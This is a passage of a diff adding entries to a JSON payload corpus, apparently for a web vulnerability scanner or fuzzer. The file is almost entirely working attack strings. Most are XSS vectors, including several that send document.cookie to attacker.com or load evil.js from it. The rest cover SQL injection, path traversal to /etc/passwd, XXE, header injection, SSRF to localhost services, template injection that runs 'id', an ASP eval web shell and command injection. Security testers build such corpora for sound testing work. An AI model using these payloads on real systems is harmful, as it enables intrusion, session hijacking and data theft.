+      "vector": "<xss onclick=alert(1)>click me</xss>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.37e5f1732a",
+      "vector": "<script>navigator.sendBeacon('http://attacker.com',document.cookie)</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.3aa98ea903",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.3afd82beeb",
+      "vector": "\\r\\nSet-Cookie: admin=true",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.3d7f01750b",
+      "vector": "../../../etc/passwd",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.41315b8352",
+      "vector": "<iframe src=\"javascript:parent.location='http://attacker.com/?c='+parent.document.cookie\"></iframe>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.426fa03cb6",
+      "vector": "';WAITFOR DELAY '00:00:05'--",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ],
+      "time_based": true
+    },
+    {
+      "id": "xss.legacy.42aea43679",
+      "vector": "${7*7}",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.430d9a7a26",
+      "vector": "<link rel=stylesheet href=\"javascript:alert(1)\">",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.4431696ae8",
+      "vector": "<math><mi xlink:href=\"javascript:alert(1)\">click</mi></math>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.44432c824d",
+      "vector": "<marquee onstart=alert(1)>text</marquee>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.447d5b5c69",
+      "vector": "<form><input name=xss onfocus=alert(1) autofocus></form>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.44ccc02cba",
+      "vector": "<isindex type=image src=1 onerror=alert(1)>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.44f1846fa7",
+      "vector": "<img src=x onerror=alert(history.length)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.479c11d183",
+      "vector": "<svg/onload=alert(document.cookie)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.47b1023a4c",
+      "vector": "<video src=1 onerror=alert(1)>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.483e5256be",
+      "vector": "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "xss.legacy.4a46c08e88",
+      "vector": "sleep(5)#",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ],
+      "time_based": true
+    },
+    {
+      "id": "xss.legacy.4c24193e22",
+      "vector": "<img src=x onerror=alert(document.domain)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.4cefbf12e2",
+      "vector": "<script>document.write('<img src=\"http://attacker.com/?c='+document.cookie+'\">')</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.4e8fa7aa63",
+      "vector": "1+sleep(5)+1",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ],
+      "time_based": true
+    },
+    {
+      "id": "xss.legacy.4ef6efbd9c",
+      "vector": "<img src=x onerror=alert(1337)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.514702f2e7",
+      "vector": "<div style=\"width:expression(alert(1))\">",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.517cf7cd04",
+      "vector": "<img src=x onerror=alert('payload')>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.526dd7f00c",
+      "vector": "<button onclick=alert(1)>Click</button>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.52dfa8de4c",
+      "vector": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.55db431287",
+      "vector": "<script src=http://attacker.com/evil.js></script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.57690bb0a6",
+      "vector": "<svg><script>fetch('http://attacker.com/?cookie='+document.cookie)</script></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.5acff5b950",
+      "vector": "<img src=x onerror=alert('test')>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.5ba63ca40d",
+      "vector": "<frameset onload=alert(1)>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.5ca2d564b0",
+      "vector": "..%252f",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "xss.legacy.5d967f3f90",
+      "vector": "<img src=x onerror=confirm(1)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.5dbd43b05f",
+      "vector": "%0d%0aLocation: http://evil.com",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.5dbd97875d",
+      "vector": "<script>top[8680439..toString(30)](1)</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.5e5f44e598",
+      "vector": "<body onpageshow=alert(1)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.5f9f12117b",
+      "vector": "<img src=x onerror=alert(document.cookie)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.5fa7341573",
+      "vector": "ldap://localhost:389/",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.60316f1a7e",
+      "vector": "<embed src=\"javascript:alert(1)\">",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.60526cee35",
+      "vector": "<img src=x onerror=alert(document.referrer)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.61ac291d18",
+      "vector": "<script>alert(/XSS/)</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.61c28b8ff5",
+      "vector": "<svg><set onbegin=alert(document.referrer) attributeName=x to=1/></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.62ecaae151",
+      "vector": "| whoami",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.63c8453b96",
+      "vector": "<img src=x onerror=alert('xss-test')>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.647bed5533",
+      "vector": "<script>/* */alert(1)/* */</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.64c78b379c",
+      "vector": "<img src=x onerror=alert(navigator.userAgent)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.667c9d4ce4",
+      "vector": "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.674ae11c75",
+      "vector": "& id",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.6a42c9687f",
+      "vector": "<img src=1 onerror=alert(1)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.6b0584d4bd",
+      "vector": "<img src=x:alert(1) onerror=eval(src)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.6bc7f5a785",
+      "vector": "..\\..\\..\\windows\\win.ini",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.6d23792708",
+      "vector": "\"-alert(1)-\"",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.6db581bfaa",
+      "vector": "' OR '1'='1",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.70e4090f90",
+      "vector": "<<script>alert(1);//<</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.717e6516a7",
+      "vector": "<input autofocus onfocus=alert(1)>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.718a2c6aad",
+      "vector": "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "xss.legacy.7260709111",
+      "vector": "<iframe src='javascript:alert(1)'></iframe>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.72d36697d6",
+      "vector": "<svg><animateTransform onbegin=alert(1) attributeName=transform></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.72ebad24b7",
+      "vector": "<img src=x onerror=top[8680439..toString(30)]()>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.735060ed1b",
+      "vector": "<script>location='http://attacker.com/?'+document.cookie</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.7367f603e5",
+      "vector": "..\\",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.736e75e23f",
+      "vector": "<%= 7*7 %>",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.75f6e8c259",
+      "vector": "<% eval request(\"cmd\") %>",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.75fe9e6e9c",
+      "vector": "<div>Hello, <script>alert(1)</script></div>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.76090f5a6b",
+      "vector": "<button onclick=alert(document.cookie)>Click</button>",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.7766734f2c",
+      "vector": "<body onload=alert('XSS')>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.7819be4ac1",
+      "vector": "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.781bd5ce6d",
+      "vector": "<script>Function`a${alert`1`}z`()</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.788ab9f88b",
+      "vector": "<math href=\"javascript:alert(1)\">CLICKME</math>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.79d154a31c",
+      "vector": "admin' --",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.79d7771dcc",
+      "vector": "</textarea><script>alert(1)</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.79eb7efd37",
+      "vector": "php://filter/convert.base64-encode/resource=/etc/passwd",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.7ab067b741",
+      "vector": "$(whoami)",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.7b49ae6ef8",
+      "vector": "<img src=x onerror=confirm(document.domain)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.7e59cebc12",
+      "vector": "<div style=\"background-image:url('javascript:alert(1)')\">",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.7f22c0a8e3",
+      "vector": "</noscript><script>alert(1)</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.7f56f99306",
+      "vector": "http://localhost:6379",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.80664588e5",
+      "vector": "<applet code=\"javascript:alert(1)\">",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.817069ce4f",
+      "vector": "<svg onload=alert(1)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.818479e6e3",
+      "vector": "<input type='text' value='<script>alert(1)</script>'>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.819f199021",
+      "vector": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.82efc223e4",
+      "vector": "<svg><set onbegin=confirm(1) attributeName=x to=1/></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.83c91c6255",
+      "vector": "<body onbeforeunload=alert(1)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.83dbce5436",
+      "vector": "<svg><desc onmouseover=confirm(1)>X</desc></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.8523ab8065",
+      "vector": "http://localhost",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.859bc9ce6c",
+      "vector": "file:///etc/passwd",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.86b8a91c81",
+      "vector": "..%255c",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "xss.legacy.86f3732d5c",
+      "vector": "<img src=x:alert(alt) onerror=alert(1)>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.87545f6d77",
+      "vector": "<table background=\"javascript:alert(1)\">",
+      "description": "Imported from the legacy corpus (js_string).",
+      "context": "js_string",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.8779a5eca5",
+      "vector": "<?php phpinfo(); ?>",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.893ac45be2",
+      "vector": "http://localhost:3306",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.8978f7fbb9",
+      "vector": "<svg><desc onmouseover=alert(1)>X</desc></svg>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.898868f8d7",
+      "vector": "http://localhost:22",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "polyglot",
+        "fuzz"
+      ]
+    },
+    {
+      "id": "xss.legacy.89a1e1d0ba",
+      "vector": "<script>document.write('<img src=x onerror=alert(1)>');</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.8aab21b9ed",
+      "vector": "<script>window['alert'](1)</script>",
+      "description": "Imported from the legacy corpus (html_text).",
+      "context": "html_text",
+      "cwe": "CWE-79",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xss.legacy.8c2c6f4895",
+      "vector": "{{config}}",
